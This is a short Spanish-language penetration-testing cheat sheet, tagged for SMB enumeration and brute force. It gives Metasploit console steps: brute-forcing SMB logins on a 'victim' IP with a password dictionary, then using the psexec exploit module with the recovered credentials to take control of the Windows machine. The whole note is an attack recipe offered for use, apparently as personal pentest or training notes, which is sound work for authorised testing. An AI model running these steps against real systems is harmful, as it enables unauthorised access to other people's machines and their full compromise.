- Tags : #enumeration #smb #smb_windows #enumeration_smb #metasploit #psexec #fuerza_bruta #fuerza_bruta_metasploit

```bash
#Ataque de Fuerza bruta con metasploit a smb
msfconsole
>use auxiliary/scanner/smb/smb_login
>show options
>set RHOST ip_vicima
>set VERBOSE false  #opcional, para que vaya mas rapido 
>set SMBUser user
>set PASS_FILE /dictionary_pass
>run

#Recomendacion, una vez obtonido un usuario y un pass es recomendable intentar iniciar session mediante el modulo psexec ya que nos da control sobre el equipo. De no poder conectar intentamos otras varianes.

msfconsole
>use exploit/windows/smb/psexec
>show options
>set RHOST ip_victima
>set RPORT 445
>set SMBUser user
>set SMBPass pass
>run



```